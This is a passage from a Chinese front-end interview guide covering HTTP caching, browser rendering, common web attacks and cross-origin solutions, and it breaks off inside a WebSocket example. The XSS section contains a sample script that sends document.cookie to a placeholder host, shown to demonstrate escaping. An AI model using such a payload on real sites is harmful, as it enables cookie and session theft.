</code></pre></div><ul><li><code>Cache-Control</code> 出现于 <code>HTTP/1.1</code>，优先级高于 <code>Expires</code> 。该属性值表示资源会在 <code>30</code> 秒后过期，需要再次请求。</li> <li><code>Cache-Control</code> 可以在请求头或者响应头中设置，并且可以组合使用多种指令</li></ul> <p><img alt="" data-src="https://s.poetries.work/gitee/2020/07/fe/8.png" loading="lazy" class="lazy"></p> <blockquote><p>从图中我们可以看到，我们可以将多个指令配合起来一起使用，达到多个目的。比如说我们希望资源能被缓存下来，并且是客户端和代理服务器都能缓存，还能设置缓存失效时间等</p></blockquote> <p><strong>一些常见指令的作用</strong></p> <p><img alt="" data-src="https://s.poetries.work/gitee/2020/07/fe/9.png" loading="lazy" class="lazy"></p> <p><strong>2.2 协商缓存</strong></p> <ul><li>如果缓存过期了，就需要发起请求验证资源是否有更新。协商缓存可以通过设置两种 <code>HTTP Header</code> 实现：<code>Last-Modified</code> 和 <code>ETag</code></li> <li>当浏览器发起请求验证资源时，如果资源没有做改变，那么服务端就会返回 <code>304</code> 状态码，并且更新浏览器缓存有效期。</li></ul> <p><img alt="" data-src="https://s.poetries.work/gitee/2020/07/fe/10.png" loading="lazy" class="lazy"></p> <p><strong>Last-Modified 和 If-Modified-Since</strong></p> <blockquote><p><code>Last-Modified</code> 表示本地文件最后修改日期，<code>If-Modified-Since</code> 会将 <code>Last-Modified</code> 的值发送给服务器，询问服务器在该日期后资源是否有更新，有更新的话就会将新的资源发送回来，否则返回 <code>304</code> 状态码。</p></blockquote> <p>但是 <code>Last-Modified</code> 存在一些弊端：</p> <ul><li>如果本地打开缓存文件，即使没有对文件进行修改，但还是会造成 <code>Last-Modified</code> 被修改，服务端不能命中缓存导致发送相同的资源</li> <li>因为 <code>Last-Modified</code> 只能以秒计时，如果在不可感知的时间内修改完成文件，那么服务端会认为资源还是命中了，不会返回正确的资源
因为以上这些弊端，所以在 <code>HTTP / 1.1</code> 出现了 <code>ETag</code></li></ul> <p><strong>ETag 和 If-None-Match</strong></p> <ul><li><code>ETag</code> 类似于文件指纹，<code>If-None-Match</code> 会将当前 <code>ETag</code> 发送给服务器，询问该资源 <code>ETag</code> 是否变动，有变动的话就将新的资源发送回来。并且 <code>ETag</code> 优先级比 <code>Last-Modified</code> 高。</li></ul> <blockquote><p>以上就是缓存策略的所有内容了，看到这里，不知道你是否存在这样一个疑问。如果什么缓存策略都没设置，那么浏览器会怎么处理？</p></blockquote> <p>对于这种情况，浏览器会采用一个启发式的算法，通常会取响应头中的 <code>Date</code> 减去 <code>Last-Modified</code> 值的 <code>10%</code> 作为缓存时间。</p> <p><strong>2.3 实际场景应用缓存策略</strong></p> <p><strong>频繁变动的资源</strong></p> <blockquote><p>对于频繁变动的资源，首先需要使用 <code>Cache-Control: no-cache</code> 使浏览器每次都请求服务器，然后配合 <code>ETag</code> 或者 <code>Last-Modified</code> 来验证资源是否有效。这样的做法虽然不能节省请求数量，但是能显著减少响应数据大小。</p></blockquote> <p><strong>代码文件</strong></p> <blockquote><p>这里特指除了 <code>HTML</code> 外的代码文件，因为 <code>HTML</code> 文件一般不缓存或者缓存时间很短。</p></blockquote> <p>一般来说，现在都会使用工具来打包代码，那么我们就可以对文件名进行哈希处理，只有当代码修改后才会生成新的文件名。基于此，我们就可以给代码文件设置缓存有效期一年 <code>Cache-Control: max-age=31536000</code>，这样只有当 <code>HTML</code> 文件中引入的文件名发生了改变才会去下载最新的代码文件，否则就一直使用缓存</p> <blockquote><p>更多缓存知识详解 http://blog.poetries.top/2019/01/02/browser-cache</p></blockquote> <h3 id="从输入url-到网页显示的完整过程"><a href="#从输入url-到网页显示的完整过程" class="header-anchor">#</a> 从输入URL 到网页显示的完整过程</h3> <ul><li><strong>网络请求</strong> <ul><li><code>DNS</code>查询（得到<code>IP</code>)，建立<code>TCP</code>连接（三次握手）</li> <li>浏览器发送<code>HTTP</code>请求</li> <li>收到请求响应，得到<code>HTML</code>源码。继续请求静态资源
<ul><li>在解析<code>HTML</code>过程中，遇到静态资源（<code>JS</code>、<code>CSS</code>、图片等）还会继续发起网络请求</li> <li>静态资源可能有缓存</li></ul></li></ul></li> <li><strong>解析：字符串=&gt;结构化数据</strong> <ul><li><code>HTML</code>构建<code>DOM</code>树</li> <li><code>CSS</code>构建<code>CSSOM</code>树（<code>style tree</code>）</li> <li>两者结合，形成<code>render tree</code></li> <li>优化解析
<ul><li><code>CSS</code>放在<code>&lt;head/&gt;</code>中，不要异步加载<code>CSS</code></li> <li><code>JS</code>放到<code>&lt;body/&gt;</code>下面，不阻塞<code>HTML</code>解析（或结合<code>defer</code>、<code>async</code>）</li> <li><code>&lt;img /&gt;</code>提前定义<code>width</code>、<code>height</code>，避免页面重新渲染</li></ul></li></ul></li> <li><strong>渲染：Render Tree绘制到页面</strong> <ul><li>计算<code>DOM</code>的尺寸、定位，最后绘制到页面</li> <li>遇到<code>JS</code>会执行，阻塞<code>HTML</code>解析。如果设置了<code>defer</code>，则并行下载<code>JS</code>，等待<code>HTML</code>解析完，在执行<code>JS</code>；如果设置了<code>async</code>，则并行下载<code>JS</code>，下载完立即执行，在继续解析<code>HTML</code>（<code>JS</code>是单线程的，<code>JS</code>执行和<code>DOM</code>渲染互斥，等<code>JS</code>执行完，在解析渲染<code>DOM</code>）</li> <li>异步<code>CSS</code>、异步图片，可能会触发重新渲染</li></ul></li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/88a40168a4f0a9f5.png" loading="lazy" class="lazy"></p> <p><strong>连环问：网页重绘repaint和重排reflow有什么区别</strong></p> <ul><li><strong>重绘</strong> <ul><li>元素外观改变：如颜色、背景色</li> <li>但元素的尺寸、定位不变，不会影响其他元素的位置</li></ul></li> <li><strong>重排</strong> <ul><li>重新计算尺寸和布局，可能会影响其他元素的位置</li> <li>如元素高度的增加，可能会使相邻的元素位置改变</li> <li>重排必定触发重绘，重绘不一定触发重排。重绘的开销较小，重排的代价较高。</li> <li><strong>减少重排的方法</strong> <ul><li>使用<code>BFC</code>特性，不影响其他元素位置</li> <li>频繁触发（<code>resize</code>、<code>scroll</code>）使用节流和防抖</li> <li>使用<code>createDocumentFragment</code>批量操作<code>DOM</code></li> <li>编码上，避免连续多次修改，可通过合并修改，一次触发</li> <li>对于大量不同的 <code>dom</code> 修改，可以先将其脱离文档流，比如使用绝对定位，或者 <code>display:none</code>，在文档流外修改完成后再放回文档里中</li> <li>动画实现的速度的选择，动画速度越快，回流次数越多，也可以选择使用 <code>requestAnimationFrame</code></li> <li><code>css3</code> 硬件加速，<code>transform</code>、<code>opacity</code>、<code>filters</code>，开启后，会新建渲染层</li></ul></li></ul></li></ul> <h3 id="常见的web前端攻击方式有哪些"><a href="#常见的web前端攻击方式有哪些" class="header-anchor">#</a> 常见的web前端攻击方式有哪些</h3> <p><strong>XSS</strong></p> <ul><li><code>Cross Site Script</code> 跨站脚本攻击</li> <li>手段：黑客将JS代码插入到网页内容中，渲染时执行<code>JS</code>代码</li> <li>预防：特殊字符串替换（前端或后端）</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 用户提交</span>
<span class="token keyword">const</span> str <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
  &lt;p&gt;123123&lt;/p&gt;
  &lt;script&gt;
      var img = document.createElement('image')
      // 把cookie传递到黑客网站 img可以跨域
      img.src = 'https://xxx.com/api/xxx?cookie=' + document.cookie
  &lt;/script&gt;
</span><span class="token template-punctuation string">`</span></span>
<span class="token keyword">const</span> newStr <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span>
<span class="token comment">// 替换字符，无法在页面中渲染</span>
<span class="token comment">//   &amp;lt;script&amp;gt;</span>
<span class="token comment">//     var img = document.createElement('image')</span>
<span class="token comment">//     img.src = 'https://xxx.com/api/xxx?cookie=' + document.cookie</span>
<span class="token comment">// &amp;lt;/script&amp;gt;</span>
</code></pre></div><p><strong>CSRF</strong></p> <ul><li><code>Cross Site Request Forgery</code> 跨站请求伪造</li> <li>手段：黑盒诱导用户去访问另一个网站的接口，伪造请求</li> <li>预防：严格的跨域限制 + 验证码机制
<ul><li>判断 <code>referer</code></li> <li>为<code>cookie</code>设置<code>sameSite</code>属性，禁止第三方网页跨域的请求能携带上<code>cookie</code></li> <li><code>token</code></li> <li>关键接口使用短信验证码</li></ul></li></ul> <blockquote><p>注意：偷取<code>cookie</code>是<code>XSS</code>做的事，<code>CSRF</code>的作用是借用<code>cookie</code>，并不能获取<code>cookie</code></p></blockquote> <p><strong>CSRF攻击攻击原理及过程如下：</strong></p> <ul><li>用户登录了<code>A</code>网站，有了<code>cookie</code></li> <li>黑盒诱导用户到<code>B</code>网站，并发起<code>A</code>网站的请求</li> <li><code>A</code>网站的<code>API</code>发现有<code>cookie</code>，会在请求中携带<code>A</code>网站的<code>cookie</code>，认为是用户自己操作的</li></ul> <p><strong>点击劫持</strong></p> <ul><li>手段：诱导界面上设置透明的<code>iframe</code>，诱导用户点击</li> <li>预防：让<code>iframe</code>不能跨域加载</li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/0b35b75ee050d7c4.png" loading="lazy" class="lazy"></p> <p><strong>DDOS</strong></p> <ul><li><code>Distribute denial-of-service</code> 分布式拒绝服务</li> <li>手段：分布式的大规模的流量访问，使服务器瘫痪</li> <li>预防：软件层不好做，需硬件预防（如阿里云的<code>WAF</code> 购买高防）</li></ul> <p><strong>SQL注入</strong></p> <ul><li>手段：黑客提交内容时，写入<code>sql</code>语句，破坏数据库</li> <li>预防：处理内容的输入，替换特殊字符</li></ul> <h3 id="跨域方案"><a href="#跨域方案" class="header-anchor">#</a> 跨域方案</h3> <blockquote><p>因为浏览器出于安全考虑，有同源策略。也就是说，如果<code>协议</code>、<code>域名</code>、<code>端口</code>有一个不同就是跨域，<code>Ajax</code> 请求会失败。</p></blockquote> <p>我们可以通过以下几种常用方法解决跨域的问题</p> <p><strong>4.1 JSONP</strong></p> <blockquote><p><code>JSONP</code> 的原理很简单，就是利用 <code>&lt;script&gt;</code>标签没有跨域限制的漏洞。通过 <code>&lt;script&gt;</code>标签指向一个需要访问的地址并提供一个回调函数来接收数据</p></blockquote> <p><strong>涉及到的端</strong></p> <p><code>JSONP</code> 需要服务端和前端配合实现。</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://domain/api?param1=a&amp;param2=b&amp;callback=jsonp<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">function</span> <span class="token function">jsonp</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>    
</code></pre></div><blockquote><p><code>JSONP</code> 使用简单且兼容性不错，但是<strong>只限于 <code>get</code> 请求</strong></p></blockquote> <p><strong>具体实现方式</strong></p> <ul><li>在开发中可能会遇到多个 <code>JSONP</code> 请求的回调函数名是相同的，这时候就需要自己封装一个 <code>JSONP</code>，以下是简单实现</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">jsonp</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> jsonpCallback<span class="token punctuation">,</span> success</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">&quot;script&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  script<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span>
  script<span class="token punctuation">.</span>async <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  script<span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">&quot;text/javascript&quot;</span><span class="token punctuation">;</span>
  window<span class="token punctuation">[</span>jsonpCallback<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    success <span class="token operator">&amp;&amp;</span> <span class="token function">success</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
  document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">jsonp</span><span class="token punctuation">(</span>
  <span class="token string">&quot;http://xxx&quot;</span><span class="token punctuation">,</span>
  <span class="token string">&quot;callback&quot;</span><span class="token punctuation">,</span>
  <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre></div><p><strong>4.2 CORS</strong></p> <blockquote><p><code>CORS</code> （Cross-Origin Resource Sharing，跨域资源共享） 是目前最为广泛的解决跨域问题的方案。方案依赖服务端/后端在响应头中添加 Access-Control-Allow-* 头，告知浏览器端通过此请求</p></blockquote> <p><strong>涉及到的端</strong></p> <blockquote><p><code>CORS</code> 只需要服务端/后端支持即可，不涉及前端改动</p></blockquote> <ul><li><code>CORS</code>需要浏览器和后端同时支持。<code>IE 8</code> 和 <code>9</code> 需要通过 <code>XDomainRequest</code> 来实现。</li> <li>浏览器会自动进行 <code>CORS</code> 通信，实现<code>CORS</code>通信的关键是后端。只要后端实现了 <code>CORS</code>，就实现了跨域。</li> <li>服务端设置 <code>Access-Control-Allow-Origin</code> 就可以开启 <code>CORS</code>。 该属性表示哪些域名可以访问资源，如果设置通配符则表示所有网站都可以访问资源。</li></ul> <p><code>CORS</code> 实现起来非常方便，只需要增加一些 <code>HTTP</code> 头，让服务器能声明允许的访问来源</p> <p>只要后端实现了 <code>CORS</code>，就实现了跨域</p> <p><img alt="" data-src="https://s.poetries.work/uploads/2022/08/b0f21ec685ae839b.png" loading="lazy" class="lazy"></p> <p>以 <code>koa</code>框架举例</p> <p>添加中间件，直接设置<code>Access-Control-Allow-Origin</code>请求头</p> <div class="language-js extra-class"><pre class="language-js"><code>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  ctx<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Access-Control-Allow-Origin'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  ctx<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Access-Control-Allow-Headers'</span><span class="token punctuation">,</span> <span class="token string">'Content-Type, Content-Length, Authorization, Accept, X-Requested-With , yourHeaderFeild'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  ctx<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Access-Control-Allow-Methods'</span><span class="token punctuation">,</span> <span class="token string">'PUT, POST, GET, DELETE, OPTIONS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'OPTIONS'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    ctx<span class="token punctuation">.</span>body <span class="token operator">=</span> <span class="token number">200</span><span class="token punctuation">;</span> 
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><p><strong>具体实现方式</strong></p> <p><code>CORS</code> 将请求分为简单请求（Simple Requests）和需预检请求（Preflighted requests），不同场景有不同的行为</p> <ul><li><strong>简单请求</strong>：不会触发预检请求的称为简单请求。当请求满足以下条件时就是一个简单请求：
<ul><li>请求方法：<code>GET</code>、<code>HEAD</code>、<code>POST</code>。</li> <li>请求头：<code>Accept</code>、<code>Accept-Language</code>、<code>Content-Language</code>、<code>Content-Type</code>。
<ul><li><code>Content-Type</code> 仅支持：<code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>、<code>text/plain</code></li></ul></li></ul></li> <li><strong>需预检请求</strong>：当一个请求不满足以上简单请求的条件时，浏览器会自动向服务端发送一个 <code>OPTIONS</code> 请求，通过服务端返回的<code>Access-Control-Allow-*</code> 判定请求是否被允许</li></ul> <p><code>CORS</code> 引入了以下几个以 <code>Access-Control-Allow-*</code> 开头：</p> <ul><li><code>Access-Control-Allow-Origin</code> 表示允许的来源</li> <li><code>Access-Control-Allow-Methods</code> 表示允许的请求方法</li> <li><code>Access-Control-Allow-Headers</code> 表示允许的请求头</li> <li><code>Access-Control-Allow-Credentials</code> 表示允许携带认证信息</li></ul> <p>当请求符合响应头的这些条件时，浏览器才会发送并响应正式的请求</p> <p><strong>4.3 nginx反向代理</strong></p> <p>反向代理只需要服务端/后端支持，几乎不涉及前端改动，只用切换接口即可</p> <p><strong>nginx 配置跨域，可以为全局配置和单个代理配置(两者不能同时配置)</strong></p> <ol><li><strong>全局配置</strong>，在<code>nginx.conf</code>文件中的 <code>http</code> 节点加入跨域信息</li></ol> <div class="language-bash extra-class"><pre class="language-bash"><code>http <span class="token punctuation">{</span>
  <span class="token comment"># 跨域配置</span>
  add_header <span class="token string">'Access-Control-Allow-Origin'</span> <span class="token string">'$http_origin'</span> <span class="token punctuation">;</span>
  add_header <span class="token string">'Access-Control-Allow-Credentials'</span> <span class="token string">'true'</span> <span class="token punctuation">;</span>
  add_header <span class="token string">'Access-Control-Allow-Methods'</span> <span class="token string">'PUT,POST,GET,DELETE,OPTIONS'</span> <span class="token punctuation">;</span>
  add_header <span class="token string">'Access-Control-Allow-Headers'</span> <span class="token string">'Content-Type,Content-Length,Authorization,Accept,X-Requested-With'</span> <span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><ol start="2"><li><strong>局部配置</strong>（单个代理配置跨域）, 在路径匹配符中加入跨域信息</li></ol> <div class="language-bash extra-class"><pre class="language-bash"><code>server <span class="token punctuation">{</span>
  listen       <span class="token number">8080</span><span class="token punctuation">;</span>
  server_name  server_name<span class="token punctuation">;</span>

  charset utf-8<span class="token punctuation">;</span>

  location / <span class="token punctuation">{</span>
    <span class="token comment"># 这里配置单个代理跨域，跨域配置</span>
    add_header <span class="token string">'Access-Control-Allow-Origin'</span> <span class="token string">'$http_origin'</span> <span class="token punctuation">;</span>
    add_header <span class="token string">'Access-Control-Allow-Credentials'</span> <span class="token string">'true'</span> <span class="token punctuation">;</span>
    add_header <span class="token string">'Access-Control-Allow-Methods'</span> <span class="token string">'PUT,POST,GET,DELETE,OPTIONS'</span> <span class="token punctuation">;</span>
    add_header <span class="token string">'Access-Control-Allow-Headers'</span> <span class="token string">'Content-Type,Content-Length,Authorization,Accept,X-Requested-With'</span> <span class="token punctuation">;</span>

    <span class="token comment">#配置代理 代理到本机服务端口</span>
    proxy_pass http://127.0.0.1:9000<span class="token punctuation">;</span>
    proxy_redirect   off<span class="token punctuation">;</span>
    proxy_set_header Host <span class="token variable">$host</span><span class="token builtin class-name">:</span><span class="token variable">$server_port</span><span class="token punctuation">;</span>
    proxy_set_header X-Real-IP <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>
    proxy_set_header X-Forwarded-For <span class="token variable">$proxy_add_x_forwarded_for</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>4.4 Node 中间层接口转发</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'koa-router'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> rp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'request-promise'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 通过node中间层转发实现接口跨域</span>
router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/github'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> <span class="token punctuation">{</span>category <span class="token operator">=</span> <span class="token string">'trending'</span><span class="token punctuation">,</span>lang <span class="token operator">=</span> <span class="token string">'javascript'</span><span class="token punctuation">,</span>limit<span class="token punctuation">,</span>offset<span class="token punctuation">,</span>period<span class="token punctuation">}</span> <span class="token operator">=</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body 
  lang <span class="token operator">=</span> lang <span class="token operator">||</span> <span class="token string">'javascript'</span>
  limit <span class="token operator">=</span> limit <span class="token operator">||</span> <span class="token number">30</span>
  offset <span class="token operator">=</span> offset <span class="token operator">||</span> <span class="token number">0</span>
  period <span class="token operator">=</span> period <span class="token operator">||</span> <span class="token string">'week'</span>
  <span class="token keyword">try</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> res <span class="token operator">=</span>  <span class="token keyword">await</span> <span class="token function">rp</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
      <span class="token comment">// 跨域的接口</span>
      <span class="token literal-property property">uri</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://e.juejin.cn/resources/github</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
      <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        category<span class="token punctuation">,</span>
        lang<span class="token punctuation">,</span>
        limit<span class="token punctuation">,</span>
        offset<span class="token punctuation">,</span>
        period
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token literal-property property">json</span><span class="token operator">:</span> <span class="token boolean">true</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    
    ctx<span class="token punctuation">.</span>body <span class="token operator">=</span> res
  <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    ctx<span class="token punctuation">.</span>body <span class="token operator">=</span> <span class="token punctuation">{</span>
      <span class="token literal-property property">code</span><span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>
      <span class="token literal-property property">message</span><span class="token operator">:</span> error<span class="token punctuation">.</span>message <span class="token operator">||</span> <span class="token string">'查询github接口失败'</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router
</code></pre></div><p><strong>4.5 Proxy</strong></p> <p>如果是通过<code>vue-cli</code>脚手架工具搭建项目，我们可以通过<code>webpack</code>为我们起一个本地服务器作为请求的代理对象</p> <p>通过该服务器转发请求至目标服务器，得到结果再转发给前端，但是最终发布上线时如果web应用和接口服务器不在一起仍会跨域</p> <p>在<code>vue.config.js</code>文件，新增以下代码</p> <div class="language-js extra-class"><pre class="language-js"><code>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">devServer</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token literal-property property">host</span><span class="token operator">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>
      <span class="token literal-property property">port</span><span class="token operator">:</span> <span class="token number">8080</span><span class="token punctuation">,</span>
      <span class="token literal-property property">open</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token comment">// vue项目启动时自动打开浏览器</span>
      <span class="token literal-property property">proxy</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token string-property property">'/api'</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">// '/api'是代理标识，用于告诉node，url前面是/api的就是使用代理的</span>
            <span class="token literal-property property">target</span><span class="token operator">:</span> <span class="token string">&quot;http://xxx.xxx.xx.xx:8080&quot;</span><span class="token punctuation">,</span> <span class="token comment">//目标地址，一般是指后台服务器地址</span>
            <span class="token literal-property property">changeOrigin</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment">//是否跨域</span>
            <span class="token literal-property property">pathRewrite</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">// pathRewrite 的作用是把实际Request Url中的'/api'用&quot;&quot;代替</span>
                <span class="token string-property property">'^/api'</span><span class="token operator">:</span> <span class="token string">&quot;&quot;</span> 
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p>通过<code>axios</code>发送请求中，配置请求的根路径</p> <div class="language-js extra-class"><pre class="language-js"><code>axios<span class="token punctuation">.</span>defaults<span class="token punctuation">.</span>baseURL <span class="token operator">=</span> <span class="token string">'/api'</span>
</code></pre></div><p>此外，还可通过服务端实现代理请求转发，以<code>express</code>框架为例</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> proxy <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http-proxy-middleware'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/api'</span><span class="token punctuation">,</span> <span class="token function">proxy</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">target</span><span class="token operator">:</span> <span class="token string">'http://localhost:4000'</span><span class="token punctuation">,</span> <span class="token literal-property property">changeOrigin</span><span class="token operator">:</span> <span class="token boolean">false</span>
                      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
module<span class="token punctuation">.</span>exports <span class="token operator">=</span> app
</code></pre></div><p><strong>4.6 websocket</strong></p> <p><code>webSocket</code>本身不存在跨域问题，所以我们可以利用<code>webSocket</code>来进行非同源之间的通信</p> <p>原理：利用<code>webSocket</code>的<code>API</code>，可以直接<code>new</code>一个<code>socket</code>实例，然后通过<code>ope</code>n方法内<code>send</code>要传输到后台的值，也可以利用<code>message</code>方法接收后台传来的数据。后台是通过<code>new WebSocket.Server({port:3000})</code>实例，利用<code>message</code>接收数据，利用<code>send</code>向客户端发送数据。具体看以下代码：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">socketConnect</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 客户端与服务器进行连接</span>
    <span class="token keyword">let</span> ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回`WebSocket`对象，赋值给变量ws</span>
    <span class="token comment">// 连接成功回调</span>
    ws<span class="token punctuation">.</span><span class="token function-variable function">onopen</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'连接成功'</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
